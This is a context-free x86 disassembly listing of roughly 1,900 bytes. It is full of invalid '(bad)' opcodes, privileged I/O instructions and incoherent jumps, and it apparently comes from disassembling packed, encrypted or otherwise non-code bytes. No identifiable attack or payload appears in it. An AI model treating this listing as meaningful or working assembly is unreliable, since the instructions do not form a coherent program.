  415e75:	add    DWORD PTR [eax-0x7f0e3d3],ebx
  415e7b:	add    eax,0x7025cf56
  415e80:	js     0x415e91
  415e82:	fist   WORD PTR [esp+ecx*1]
  415e85:	add    eax,0xa55eaa95
  415e8a:	cdq    
  415e8b:	push   ss
  415e8c:	fcomp  QWORD PTR [ebx+0x42]
  415e8f:	out    0x20,eax
  415e91:	xor    ah,BYTE PTR [ebx-0x44588058]
  415e97:	fucomp st(1)
  415e99:	push   ss
  415e9a:	cli    
  415e9b:	mov    edx,ebp
  415e9d:	sub    al,0x58
  415e9f:	inc    ebx
  415ea0:	cmp    BYTE PTR ds:0xa11772ed,0xd2
  415ea7:	jno    0x415e74
  415ea9:	jl     0x415e8f
  415eab:	(bad)  
  415eac:	mov    bh,0x38
  415eae:	in     eax,0xeb
  415eb0:	out    0x54,eax
  415eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb3:	or     DWORD PTR [edx+0x13cfa3c9],ebx
  415eb9:	cmp    BYTE PTR [edx+0x3aa21170],al
  415ebf:	and    eax,0xbc5fcddb
  415ec4:	call   0x6f5d0e88
  415ec9:	fidivr WORD PTR [esi+0x13]
  415ecc:	xchg   esi,eax
  415ecd:	imul   esi,DWORD PTR [esi],0x75
  415ed0:	in     eax,dx
  415ed1:	cmp    bl,BYTE PTR [edx+edi*4]
  415ed4:	jge    0x415f51
  415ed6:	sti    
  415ed7:	out    0xa3,eax
  415ed9:	das    
  415eda:	push   0xc509a20
  415edf:	(bad)  
  415ee1:	(bad)  
  415ee3:	push   esi
  415ee4:	out    0x62,eax
  415ee6:	sbb    DWORD PTR [ecx],ebp
  415ee8:	pop    ebx
  415ee9:	(bad)  
  415eea:	fmul   DWORD PTR [ebp+0x508ed14b]
  415ef0:	in     eax,dx
  415ef1:	loopne 0x415efd
  415ef3:	out    dx,eax
  415ef4:	dec    edx
  415ef5:	mov    dl,0x8e
  415ef7:	mov    esi,ebp
  415ef9:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415efb:	test   DWORD PTR [edx-0x37],ecx
  415efe:	push   ebp
  415eff:	jo     0x415e8f
  415f01:	std    
  415f02:	popf   
  415f03:	jg     0x415f28
  415f05:	adc    ebp,eax
  415f07:	xor    DWORD PTR [edi],ebx
  415f09:	cmp    eax,0x140bda0c
  415f0e:	pop    eax
  415f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f10:	inc    esp
  415f11:	lahf   
  415f12:	pop    edx
  415f13:	push   0xd30cf814
  415f18:	sbb    esi,0xffffffb2
  415f1b:	lea    esi,[edx]
  415f1d:	aad    0x76
  415f1f:	mov    dl,0xa2
  415f21:	imul   edx,DWORD PTR [edx+esi*4],0xeecc03b4
  415f28:	push   ss
  415f29:	ret    0x1a99
  415f2c:	or     DWORD PTR [esi+0x5c],ebp
  415f2f:	out    dx,eax
  415f30:	cmp    cl,BYTE PTR [ecx+0x7c]
  415f33:	call   0x676fc6a0
  415f38:	test   BYTE PTR [edi+0x1f5b87e9],ch
  415f3e:	push   ebx
  415f3f:	xchg   edi,eax
  415f40:	or     edx,eax
  415f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f43:	jl     0x415f54
  415f45:	test   al,0x78
  415f47:	mov    es,WORD PTR [ebx-0x12]
  415f4a:	loopne 0x415f77
  415f4c:	js     0x415f93
  415f4e:	push   cs
  415f4f:	pop    ebx
  415f50:	mov    dl,BYTE PTR [edi+edi*4-0x51]
  415f54:	outs   dx,BYTE PTR ds:[esi]
  415f55:	fdivr  QWORD PTR [edx]
  415f57:	xchg   ebp,eax
  415f58:	in     al,0x62
  415f5a:	(bad)  
  415f5b:	call   0x50a57f5e
  415f60:	lods   al,BYTE PTR ds:[esi]
  415f61:	mov    eax,0x6c7b6fb9
  415f66:	fidiv  WORD PTR [edi-0x3b]
  415f69:	outs   dx,DWORD PTR ds:[esi]
  415f6a:	in     al,dx
  415f6b:	cmp    edi,DWORD PTR [ecx+0x44]
  415f6e:	add    dl,cl
  415f70:	mov    al,ds:0xa6b7abbb
  415f75:	int3   
  415f76:	ja     0x415f2f
  415f78:	neg    BYTE PTR [edx+0xbc34a40]
  415f7e:	test   eax,0x3171e4b
  415f83:	add    DWORD PTR [ebp+0x44],esp
  415f86:	mov    sp,0xb91e
  415f8a:	push   ss
  415f8b:	cmp    DWORD PTR [edx+0x16],ebx
  415f8e:	test   dh,dl
  415f90:	jae    0x415fc9
  415f92:	add    dl,bl
  415f94:	cmp    DWORD PTR [edx-0x3a],0x1f
  415f98:	and    DWORD PTR ds:0x6e1c6646,edx
  415f9e:	lods   eax,DWORD PTR ds:[esi]
  415f9f:	xchg   ecx,eax
  415fa0:	pop    ds
  415fa1:	shr    DWORD PTR [ebx-0x5d770f82],cl
  415fa7:	add    dh,BYTE PTR [ebp-0x821da72]
  415fad:	mov    ebp,0xdba957b2
  415fb2:	fidiv  WORD PTR ds:0x60c83699
  415fb8:	lods   eax,DWORD PTR ds:[esi]
  415fb9:	xchg   cl,bl
  415fbb:	push   eax
  415fbc:	jecxz  0x415ff9
  415fbe:	idiv   BYTE PTR [ecx]
  415fc0:	mov    bh,0x3c
  415fc2:	(bad)  
  415fc3:	xchg   ebp,eax
  415fc4:	nop
  415fc5:	call   0xaa2307bb
  415fca:	retf   
  415fcb:	cmp    dh,BYTE PTR [eax]
  415fcd:	sbb    eax,0xf9fcff
  415fd2:	mov    cl,BYTE PTR [ebp+ecx*4-0x29]
  415fd6:	push   0x0
  415fd8:	and    ebx,DWORD PTR [ebx+0x72]
  415fdb:	cmp    cl,BYTE PTR [ecx+0x5b5ed9ea]
  415fe1:	push   edi
  415fe2:	sbb    al,0xca
  415fe4:	pop    edx
  415fe5:	data16 cli 
  415fe7:	test   DWORD PTR [esi-0x39d4f64],0xa4b37eb
  415ff1:	nop
  415ff2:	neg    ecx
  415ff4:	jae    0x41602b
  415ff6:	mov    bl,0x39
  415ff8:	cld    
  415ff9:	(bad)  
  415ffa:	in     al,0xac
  415ffc:	outs   dx,DWORD PTR ds:[esi]
  415ffd:	sub    edi,ebx
  415fff:	jg     0x416055
  416001:	es sub eax,0x1162e20d
  416007:	fs mov ah,0x1
  41600a:	dec    eax
  41600b:	js     0x41606f
  41600d:	mov    ds:0x752582fc,al
  416012:	dec    edx
  416013:	fst    QWORD PTR [esi-0x6f]
  416016:	(bad)  
  416017:	cmp    BYTE PTR [esi+0x70f7fa6b],bl
  41601d:	inc    ecx
  41601e:	out    dx,eax
  41601f:	or     eax,0x3d964a7
  416024:	ret    
  416025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416026:	(bad)  
  416028:	add    ah,BYTE PTR [ebp*8-0x790c6b67]
  41602f:	sti    
  416030:	sub    eax,0x7441d341
  416035:	lock push ebp
  416037:	mov    dl,0x67
  416039:	nop
  41603a:	jno    0x416086
  41603c:	imul   DWORD PTR [edx]
  41603e:	lods   al,BYTE PTR ds:[esi]
  41603f:	aaa    
  416040:	jnp    0x415fed
  416042:	fisubr WORD PTR [eax+eiz*2+0x76]
  416046:	call   0x45fb:0xf15033f4
  41604d:	sti    
  41604e:	cmp    BYTE PTR [esi-0x626e1b65],0xa2
  416055:	cmp    ebx,ecx
  416057:	lods   eax,DWORD PTR ds:[esi]
  416058:	les    edi,FWORD PTR [eax+0x64]
  41605b:	pop    ds
  41605c:	out    0x3d,eax
  41605e:	xchg   esi,eax
  41605f:	add    BYTE PTR [eax],0x46
  416062:	sbb    ecx,DWORD PTR [edi-0x74]
  416065:	or     DWORD PTR [edi-0x6e817f78],ecx
  41606b:	ficom  WORD PTR [edi+ecx*1]
  41606e:	inc    edx
  41606f:	popf   
  416070:	ficom  DWORD PTR [edx-0xe48cadb]
  416076:	outs   dx,DWORD PTR ds:[esi]
  416077:	lods   eax,DWORD PTR ds:[esi]
  416078:	mov    ebp,0x1c548d80
  41607d:	fcomp  QWORD PTR [edi]
  41607f:	fstp   TBYTE PTR [eax]
  416081:	push   edi
  416082:	cmc    
  416083:	lods   al,BYTE PTR ds:[esi]
  416084:	test   al,0xb1
  416086:	daa    
  416087:	add    BYTE PTR [edx-0x3b],0x32
  41608b:	jge    0x416092
  41608d:	push   esi
  41608e:	imul   eax,DWORD PTR ds:0xed1838e4,0x4b0cede9
  416098:	fidiv  WORD PTR [edi]
  41609a:	xlat   BYTE PTR ds:[ebx]
  41609b:	and    BYTE PTR [edx*4-0x6a3e1563],ch
  4160a2:	stos   DWORD PTR es:[edi],eax
  4160a3:	xchg   esi,eax
  4160a4:	sbb    BYTE PTR [ecx-0x78f7878e],0xaa
  4160ab:	lea    esi,[esi-0x27]
  4160ae:	xor    ah,0x86
  4160b1:	xor    edi,DWORD PTR [ebx]
  4160b3:	pusha  
  4160b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160b5:	lahf   
  4160b6:	pop    esi
  4160b7:	in     ax,dx
  4160b9:	mov    ebx,0x91f81803
  4160be:	mov    BYTE PTR [ebx+0x74db487],ah
  4160c4:	pop    eax
  4160c5:	sahf   
  4160c6:	pop    ss
  4160c7:	or     eax,0xb0e7beb9
  4160cc:	fstp   DWORD PTR [esi-0x1f95f190]
  4160d2:	fld    DWORD PTR [edx+0x7e]
  4160d5:	cs int3 
  4160d7:	adc    esp,eax
  4160d9:	sbb    bh,BYTE PTR [esp+esi*2-0x5f]
  4160dd:	ret    0x43fb
  4160e0:	sub    al,0xa9
  4160e2:	mov    eax,ds:0xfc216c63
  4160e7:	xchg   esi,eax
  4160e9:	ret    
  4160ea:	aad    0xe8
  4160ec:	sahf   
  4160ed:	stos   DWORD PTR es:[edi],eax
  4160ee:	mov    al,ds:0xc8fa6fe1
  4160f3:	push   edx
  4160f4:	test   eax,0x9c6b535b
  4160f9:	call   0x78cff0cc
  4160fe:	xor    ebx,0x5f195e52
  416104:	mov    bh,0xce
  416106:	test   BYTE PTR [esi+0x437554bc],dl
  41610c:	push   ds
  41610d:	ffreep st(3)
  41610f:	sub    edi,DWORD PTR [eax]
  416111:	shl    ecx,cl
  416113:	cwde   
  416114:	call   0xb2cd:0x5fe878e3
  41611b:	pop    edx
  41611c:	push   ecx
  41611d:	call   0x27b053da
  416122:	int3   
  416123:	adc    al,BYTE PTR [ecx+0x32]
  416126:	inc    edi
  416127:	pop    ebx
  416128:	jne    0x416106
  41612a:	jmp    0x41618c
  41612c:	ret    
  41612d:	jbe    0x41610f
  41612f:	push   eax
  416130:	dec    esp
  416131:	(bad)  
  416132:	sbb    eax,0xcc1c2eb2
  416137:	mov    WORD PTR [esi],ss
  416139:	out    dx,eax
  41613a:	dec    eax
  41613b:	fwait
  41613c:	sbb    DWORD PTR [esi],edx
  41613e:	adc    al,0x90
  416140:	sub    DWORD PTR [edx+ecx*8-0x59],edi
  416144:	std    
  416145:	(bad)  
  416146:	gs stc 
  416148:	push   0xca8e936d
  41614d:	push   es
  41614e:	ret    0x2db3
  416151:	mov    al,al
  416153:	das    
  416154:	je     0x4161bc
  416156:	sbb    al,0xbb
  416158:	cmp    eax,0xbc96d7c5
  41615d:	call   0x254c:0x9fd214a3
  416164:	daa    
  416165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416166:	mov    ds:0x9d8e87a5,al
  41616b:	arpl   bp,di
  41616d:	fstp   TBYTE PTR [ebp+0x60]
  416170:	or     cl,bh
  416172:	push   ss
  416173:	jnp    0x41619d
  416175:	hlt    
  416176:	(bad)  
  416178:	sub    al,0xab
  41617a:	daa    
  41617b:	push   ebp
  41617c:	in     al,dx
  41617d:	aaa    
  41617e:	mov    ds:0xcbfddba2,eax
  416183:	shr    DWORD PTR [esi],1
  416185:	push   eax
  416186:	dec    edx
  416187:	in     eax,dx
  416188:	dec    edi
  416189:	iret   
  41618a:	mov    edi,0x528dfeb0
  41618f:	sti    
  416190:	and    BYTE PTR [ebp-0x1d],dh
  416193:	dec    edi
  416194:	hlt    
  416195:	xor    al,dh
  416197:	pop    esi
  416198:	ror    DWORD PTR [ecx-0xc0bdf9e],0x20
  41619f:	add    eax,esp
  4161a1:	jo     0x4161c8
  4161a3:	or     BYTE PTR [ebx-0x1ee882ac],bh
  4161a9:	test   eax,0xdc65eced
  4161ae:	jno    0x4161fa
  4161b0:	fiadd  WORD PTR [ebx]
  4161b2:	cmc    
  4161b3:	add    DWORD PTR [edi-0x7b2cce0a],ecx
  4161b9:	sti    
  4161ba:	mov    cl,0x53
  4161bc:	(bad)  
  4161bd:	out    0xf,al
  4161bf:	xchg   BYTE PTR [edi+0x6f90a129],al
  4161c5:	mov    dl,0xed
  4161c7:	outs   dx,DWORD PTR ds:[esi]
  4161c8:	fisub  WORD PTR [ecx]
  4161ca:	jmp    0x416151
  4161cc:	ret    
  4161cd:	ror    DWORD PTR [eax+eax*4+0x35],0xcc
  4161d2:	enter  0x1a34,0x76
  4161d6:	repz clc 
  4161d8:	aam    0xb
  4161da:	scas   eax,DWORD PTR es:[edi]
  4161db:	xchg   ebx,eax
  4161dc:	ja     0x416224
  4161de:	cwde   
  4161df:	cmp    esp,DWORD PTR [ebx+0x6f]
  4161e2:	sub    eax,0x95b2d5a1
  4161e7:	fwait
  4161e8:	(bad)  
  4161e9:	mov    WORD PTR [ebx],fs
  4161eb:	mul    DWORD PTR [ecx-0x19f07b2b]
  4161f1:	inc    ebp
  4161f2:	call   0xc00029e1
  4161f7:	and    eax,0xabd686a0
  4161fc:	gs sbb al,0xf6
  4161ff:	dec    eax
  416200:	push   ebp
  416201:	and    ecx,DWORD PTR [ebx-0x79561f86]
  416207:	es mov edi,0x5f2b0d8
  41620d:	icebp  
  41620e:	addr16 push 0x45
  416211:	and    BYTE PTR [esi-0x48870918],bh
  416217:	daa    
  416218:	mov    bh,0x1c
  41621a:	ret    
  41621b:	ss daa 
  41621d:	push   eax
  41621e:	mov    eax,ds:0x8aee2f04
  416223:	out    dx,eax
  416224:	ret    0xb6f
  416227:	cmp    al,0x17
  416229:	mov    al,ss:0x2c0e20aa
  41622f:	sbb    eax,0x939832eb
  416234:	inc    esi
  416235:	mov    dl,0xdc
  416237:	call   FWORD PTR [ebp-0x45]
  41623a:	lods   al,BYTE PTR ds:[esi]
  41623b:	xchg   BYTE PTR [ebp+edx*1-0x23],bl
  41623f:	mov    ebp,ss
  416241:	push   0x32838610
  416246:	(bad)  
  416247:	xchg   edi,eax
  416248:	addr16 mov edi,0x4bafe9c9
  41624e:	sbb    DWORD PTR [eax-0x5560aa84],ecx
  416254:	pop    ecx
  416255:	nop
  416256:	sbb    DWORD PTR [ebx-0x410d015e],esp
  41625c:	or     BYTE PTR [ebp+ebx*2-0x68],al
  416260:	lods   al,BYTE PTR ds:[esi]
  416261:	ret    
  416262:	ret    
  416263:	je     0x416288
  416265:	cmc    
  416266:	sub    ebp,DWORD PTR fs:[eax+0x5f5ecb9f]
  41626d:	out    0xfe,eax
  41626f:	adc    ch,BYTE PTR [ebp-0x7f]
  416272:	pop    ebx
  416273:	inc    ah
  416275:	mov    edx,0x99d42191
  41627a:	xchg   BYTE PTR [edx],al
  41627c:	cmp    ebp,ebp
  41627e:	sbb    al,BYTE PTR [edx+esi*1-0x70]
  416282:	(bad)  
  416283:	faddp  st(2),st
  416285:	addr16 leave 
  416287:	stc    
  416288:	mov    BYTE PTR [eax+ebx*1],dl
  41628b:	inc    esi
  41628c:	outs   dx,BYTE PTR ds:[esi]
  41628d:	into   
  41628e:	jmp    0x4162f9
  416290:	out    0xf9,eax
  416292:	repz std 
  416294:	in     eax,0xd6
  416296:	xchg   edi,eax
  416297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416298:	stc    
  416299:	pop    esi
  41629a:	inc    ebp
  41629b:	adc    al,0x7a
  41629d:	fldenv [esi]
  41629f:	mov    ecx,0x1bf2738
  4162a4:	add    eax,DWORD PTR [edi]
  4162a6:	rol    cl,0xaa
  4162a9:	(bad)  
  4162aa:	and    al,0x6b
  4162ac:	dec    edx
  4162ad:	jno    0x416300
  4162af:	dec    ecx
  4162b0:	or     ebx,edx
  4162b2:	outs   dx,DWORD PTR ds:[esi]
  4162b3:	out    0x53,eax
  4162b5:	fwait
  4162b6:	iret   
  4162b7:	shr    DWORD PTR [edx+0x172a0bb3],1
  4162bd:	popa   
  4162be:	push   eax
  4162bf:	ficomp DWORD PTR [ebp-0x2c77f17e]
  4162c5:	adc    al,0x23
  4162c7:	mov    dl,0x8a
  4162c9:	adc    eax,0x487f6779
  4162ce:	xor    BYTE PTR [esi],ah
  4162d0:	outs   dx,BYTE PTR ds:[esi]
  4162d1:	rcr    BYTE PTR [ecx],cl
  4162d3:	lock pop es
  4162d5:	pushf  
  4162d6:	in     al,dx
  4162d7:	or     al,0x37
  4162d9:	add    esp,eax
  4162db:	(bad)  
  4162dc:	and    dl,al
  4162de:	dec    esp
  4162df:	jb     0x4162a3
  4162e1:	clc    
  4162e2:	xchg   edi,eax
  4162e3:	xchg   ecx,eax
  4162e4:	dec    esp
  4162e5:	(bad)  
  4162e6:	jecxz  0x4162f1
  4162e8:	inc    ebx
  4162e9:	pop    ecx
  4162ea:	mov    dl,0x5e
  4162ec:	repnz addr16 dec esp
  4162ef:	hlt    
  4162f0:	imul   ebp,DWORD PTR [ecx-0x4b5b1ac9],0x2c
  4162f7:	fiadd  DWORD PTR [edi]
  4162f9:	jl     0x4162a4
  4162fb:	rcl    BYTE PTR [ebx],1
  4162fd:	fcom   DWORD PTR [ecx+edx*1-0x7d]
  416301:	xchg   DWORD PTR [ecx-0x49f69fd7],esi
  416307:	sbb    edi,DWORD PTR [esi]
  416309:	pop    edx
  41630a:	jmp    0x413c:0xf150
  416310:	out    0x51,al
  416312:	xchg   edi,eax
  416313:	shl    BYTE PTR [edx+0x66106e32],0x38
  41631a:	ins    DWORD PTR es:[edi],dx
  41631b:	(bad)  
  41631c:	mov    ch,BYTE PTR [edi-0x700abcb3]
  416322:	push   cs
  416323:	(bad)  
  416324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416325:	or     dl,al
  416327:	push   esp
  416328:	in     al,dx
  416329:	scas   al,BYTE PTR es:[edi]
  41632a:	xchg   edi,eax
  41632b:	push   ss
  41632c:	jmp    0x416330
  41632e:	cs push ds
  416330:	xchg   edi,eax
  416331:	xchg   ebx,eax
  416332:	mov    edi,0x2413e7e3
  416337:	ss push 0x5c0679d3
  41633d:	lock and al,0xbb
  416340:	add    BYTE PTR [ebp+0x1695d222],al
  416346:	fisubr DWORD PTR ds:0x927cb94f
  41634c:	sbb    dl,bh
  41634e:	fstp   st(6)
  416350:	xor    edi,DWORD PTR [edi+edi*8+0x6baab67b]
  416357:	sub    DWORD PTR ds:0x25a0472,esi
  41635d:	lea    ebp,[ebp+esi*2+0xa1e81ab]
  416364:	or     WORD PTR [ebp+esi*8+0x44],sp
  416369:	pushf  
  41636a:	and    al,0x72
  41636c:	pop    ebx
  41636d:	nop
  41636e:	and    al,BYTE PTR [esi+edi*4-0x42]
  416372:	out    dx,eax
  416373:	scas   al,BYTE PTR es:[edi]
  416374:	push   eax
  416375:	cmp    DWORD PTR [ecx],0x35
  416378:	ja     0x416356
  41637a:	jmp    0x6122ae8a
  41637f:	push   es
  416380:	mov    esi,0xc3da38c9
  416385:	les    ebx,FWORD PTR ds:0x68fc28
  41638b:	pslld  mm1,mm4
  41638e:	xchg   edi,edx
  416390:	sub    BYTE PTR [ebx],dl
  416392:	test   edx,edx
  416394:	out    dx,eax
  416395:	jb     0x41637b
  416397:	jns    0x41634f
  416399:	pop    ecx
  41639a:	sub    eax,0x40f1881e
  41639f:	xor    al,0x53
  4163a1:	push   edi
  4163a2:	push   ss
  4163a3:	loopne 0x416402
  4163a5:	out    0xc4,al
  4163a7:	ins    DWORD PTR es:[edi],dx
  4163a8:	in     eax,0x50
  4163aa:	lds    eax,FWORD PTR [edx+0x59af8bfa]
  4163b0:	pop    es
  4163b1:	push   edx
  4163b2:	adc    DWORD PTR [edi],eax
  4163b4:	jmp    0x5502:0x2b47b577
  4163bb:	ins    DWORD PTR es:[edi],dx
  4163bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163bd:	data16 aam 0x3f
  4163c0:	call   0xaf50:0xc2ef87d4
  4163c7:	cmp    dh,BYTE PTR [ecx-0x3f]
  4163ca:	sbb    BYTE PTR [ebx-0x1ede5e1],dl
  4163d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163d1:	push   0x12
  4163d3:	xor    esi,DWORD PTR [edx]
  4163d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d6:	stos   DWORD PTR es:[edi],eax
  4163d7:	test   ch,0x9c
  4163da:	push   edx
  4163db:	cwde   
  4163dc:	repz xor eax,0x975e4f7f
  4163e2:	or     DWORD PTR [edx],0x7e
  4163e5:	lahf   
  4163e6:	fnsave [ebx+0x2]
  4163e9:	ins    DWORD PTR es:[edi],dx
  4163ea:	mov    eax,0x69e0cbeb
  4163ef:	mov    dl,0x5
  4163f1:	adc    ebp,DWORD PTR [ebx]
  4163f3:	add    edx,DWORD PTR ds:0xfba28f46
  4163f9:	pop    esp
  4163fa:	jne    0x41646b
  4163fc:	xchg   esi,eax
  4163fd:	inc    esi
  4163fe:	pop    edi
  4163ff:	mov    WORD PTR [edi],ss
  416401:	sub    al,BYTE PTR [esi+0x1508ed2d]
  416407:	mov    BYTE PTR [ebp+0x7b6d772e],al
  41640d:	scas   al,BYTE PTR es:[edi]
  41640e:	(bad)  
  41640f:	pop    eax
  416410:	sahf   
  416411:	inc    ecx
  416412:	xchg   esp,eax
  416413:	sahf   
  416414:	cmp    BYTE PTR ds:0xc84a6d45,0xb1
  41641b:	mov    ebp,0xbe6c6e87
  416420:	sbb    BYTE PTR [ebp+0x7],0xd8
  416424:	push   ecx
  416425:	outs   dx,BYTE PTR ds:[esi]
  416426:	push   0xffffffbe
  416428:	or     BYTE PTR [esi-0x6fe8e573],al
  41642e:	loope  0x41645d
  416430:	mov    DWORD PTR [eax+0x1ffb74f3],edi
  416436:	clc    
  416437:	mov    ds:0x7b46f958,al
  41643c:	aaa    
  41643d:	pop    esp
  41643e:	cmp    esp,DWORD PTR [edx+0x7]
  416441:	mov    ?,WORD PTR [esi-0x2]
  416444:	in     al,dx
  416445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416446:	jne    0x41647b
  416448:	ja     0x4164a3
  41644a:	shr    DWORD PTR [ebp-0x4a],1
  41644d:	add    DWORD PTR [edi+0x39256a1],edi
  416453:	sub    ah,BYTE PTR [ecx-0x42]
  416456:	ret    0x9c52
  416459:	ret    
  41645a:	mov    bh,0xea
  41645c:	mov    edi,0xf3bf59a
  416461:	mov    bl,0xe4
  416463:	inc    edi
  416464:	add    ebp,DWORD PTR [ebx-0x5f]
  416467:	hlt    
  416468:	repnz fnsetpm(287 only) 
  41646b:	popa   
  41646c:	mov    bl,0xa8
  41646e:	aam    0x27
  416470:	mov    eax,0x2f2bf4e7
  416475:	jecxz  0x416436
  416477:	arpl   WORD PTR [esi+0x6d4c2c70],ax
  41647d:	fldenv [eax-0x54]
  416480:	hlt    
  416481:	mov    bh,0x65
  416483:	jb     0x41640b
  416485:	fild   WORD PTR [esi]
  416487:	xchg   ebp,eax
  416488:	sub    BYTE PTR [ebx-0x4b],bl
  41648b:	cmp    dl,BYTE PTR [ecx+0xf]
  41648e:	mov    ebx,DWORD PTR ds:0x519b58f
  416494:	add    edx,DWORD PTR [edi]
  416496:	outs   dx,DWORD PTR ds:[esi]
  416497:	cmp    dl,BYTE PTR [edi]
  416499:	xchg   WORD PTR [ecx+0x608d2ec5],bx
  4164a0:	in     eax,dx
  4164a1:	fldcw  WORD PTR [ebx+ebp*4]
  4164a4:	sbb    esi,DWORD PTR [esi]
  4164a6:	pop    ebp
  4164a7:	lock dec ebx
  4164a9:	mov    ch,0x39
  4164ab:	(bad)  
  4164ac:	call   0x3715c685
  4164b1:	adc    BYTE PTR [edi+0x12],dh
  4164b4:	(bad)  
  4164b7:	into   
  4164b8:	add    BYTE PTR [edx+edx*8+0x57],cl
  4164bc:	(bad)  
  4164bd:	xor    DWORD PTR [eax+esi*1],esi
  4164c0:	je     0x4164f2
  4164c2:	jae    0x416469
  4164c4:	sbb    DWORD PTR [ebx+0x2194992d],edi
  4164ca:	ja     0x4164dd
  4164cc:	icebp  
  4164cd:	push   cs
  4164ce:	add    ebx,DWORD PTR [esi]
  4164d0:	inc    edx
  4164d1:	fstp   QWORD PTR [eax+0x62]
  4164d4:	(bad)  
  4164d5:	cld    
  4164d6:	jle    0x416485
  4164d8:	jns    0x41651d
  4164da:	mov    eax,ds:0xbfbb0b0b
  4164df:	lock jg 0x41648a
  4164e2:	out    dx,eax
  4164e3:	inc    ebx
  4164e4:	addr16 js 0x416501
  4164e7:	dec    edx
  4164e8:	jl     0x41651d
  4164ea:	pop    esi
  4164eb:	scas   eax,DWORD PTR es:[edi]
  4164ec:	jns    0x416537
  4164ee:	mov    dh,0xfa
  4164f0:	retf   
  4164f1:	imul   ebx,DWORD PTR [edx],0x7ae8c6d0
  4164f7:	scas   eax,DWORD PTR es:[edi]
  4164f8:	add    al,0x48
  4164fa:	cdq    
  4164fb:	jbe    0x4164cb
  4164fd:	inc    eax
  4164fe:	(bad)  
  416501:	fstp   QWORD PTR [ebx]
  416503:	pop    edx
  416504:	xchg   BYTE PTR [edx+0x12],ah
  416507:	mov    ch,0xac
  416509:	jl     0x4164a5
  41650b:	or     al,0xa7
  41650d:	mov    BYTE PTR [ebx-0x4785e59f],bh
  416513:	dec    ecx
  416514:	push   es
  416515:	(bad)  
  416516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416517:	(bad)  
  416518:	in     al,0x90
  41651a:	retf   
  41651b:	jno    0x416526
  41651d:	cli    
  41651e:	jge    0x4164a9
  416520:	pop    edx
  416521:	push   ebx
  416522:	fwait
  416523:	xchg   ebx,eax
  416524:	or     al,0x1b
  416526:	out    0x2,eax
  416528:	test   al,0x1d
  41652a:	mov    ah,0xe9
  41652c:	mov    ecx,0xff806baa
  416531:	imul   ecx
  416533:	scas   eax,DWORD PTR es:[edi]
  416534:	ins    BYTE PTR es:[edi],dx
  416535:	in     eax,0x43
  416537:	cmp    cl,BYTE PTR [ebx-0x72]
  41653a:	outs   dx,DWORD PTR ds:[esi]
  41653b:	pop    edi
  41653c:	aas    
  41653d:	inc    esp
  41653e:	pop    ecx
  41653f:	(bad)  
  416540:	jno    0x41656b
  416542:	sti    
  416543:	test   BYTE PTR [esi+eax*8+0x1ec93e64],dl
  41654a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41654b:	(bad)
  41654e:	push   esi
  41654f:	add    dl,BYTE PTR [edi+0x284b35d5]
  416555:	pop    edx
  416556:	xchg   edi,eax
  416557:	loop   0x41652b
  416559:	aam    0xb
  41655b:	in     al,dx
  41655c:	push   edx
  41655d:	jp     0x416577
  41655f:	mov    ah,0xf8
  416561:	and    cl,bl
  416563:	jle    0x4165e3
  416565:	push   ebx
  416566:	mov    eax,ds:0xc6ab7b8c
  41656b:	jmp    0x9b55:0xd80c6e1c
  416572:	sub    esi,DWORD PTR [esi]
  416574:	push   cs
  416575:	call   0x5d35d55d
  41657a:	sub    eax,0x62375825
  41657f:	xchg   DWORD PTR [esi+0x67],edi
  416582:	fsubr  QWORD PTR [edx]
  416584:	into   
  416585:	adc    dh,bl
  416587:	in     eax,dx
  416588:	arpl   cx,sp
  41658a:	fistp  WORD PTR [edx+0x37bb67a0]
  416590:	fsubr  DWORD PTR [edx]
  416592:	aam    0x32
  416594:	mov    eax,ds:0xd8787067
  416599:	mov    dh,0x6a
  41659b:	dec    ecx
  41659c:	fst    DWORD PTR [ebx+eiz*4]
  41659f:	push   ds
  4165a0:	retf   0x8493
  4165a3:	fmul   DWORD PTR [eax-0x6a7aca90]
  4165a9:	pop    eax
  4165aa:	cs into 
  4165ac:	test   BYTE PTR [edi+ebp*1+0x22cb6a3f],bl
  4165b3:	mov    ds:0x43c82a4d,al
  4165b8:	mov    eax,0x82d93169
  4165bd:	int    0x2c
  4165bf:	fwait
  4165c0:	pop    ecx
  4165c1:	je     0x416642
  4165c3:	mov    DWORD PTR ds:0x76af4393,edi
  4165c9:	cwde   
  4165ca:	push   ds
  4165cb:	popf   
  4165cc:	(bad)  
  4165cd:	hlt    
  4165ce:	adc    dh,BYTE PTR [ebx+0x3e]
  4165d1:	ss (bad) 
  4165d3:	jl     0x41656f
  4165d5:	add    DWORD PTR [edx],edi
  4165d7:	push   esi
  4165d8:	lds    edx,FWORD PTR [eax-0xc5abae9]
  4165de:	loop   0x4165e8
  4165e0:	push   ebx
  4165e1:	pop    ss
  4165e2:	xor    bl,BYTE PTR [eax+0x14]
  4165e5:	xor    DWORD PTR [esi+0x6f1e5f34],esi
  4165eb:	jmp    0x41661a
  4165ed:	rcl    BYTE PTR [ecx],0x22
  4165f0:	mov    ch,0xfe
  4165f2:	xchg   esp,eax
  4165f3:	jp     0x416624
  4165f5:	inc    ebx
  4165f6:	daa    
  4165f7:	inc    edi
  4165f8:	stos   BYTE PTR es:[edi],al
  4165f9:	mov    WORD PTR [edx+ebp*1],?
  4165fc:	outs   dx,DWORD PTR ds:[esi]
  4165fd:	push   edi
  4165fe:	(bad)  
  4165ff:	mov    eax,0x635f1853
  416604:	test   al,0xf6
  416606:	xor    esp,DWORD PTR [ebp+0xf]
  416609:	pushf  
  41660a:	dec    ebx
  41660b:	lods   eax,DWORD PTR ds:[esi]
  41660c:	inc    esi
  41660d:	jo     0x416643
  41660f:	add    al,0x50
  416611:	adc    ch,dl
  416613:	sub    esp,edx
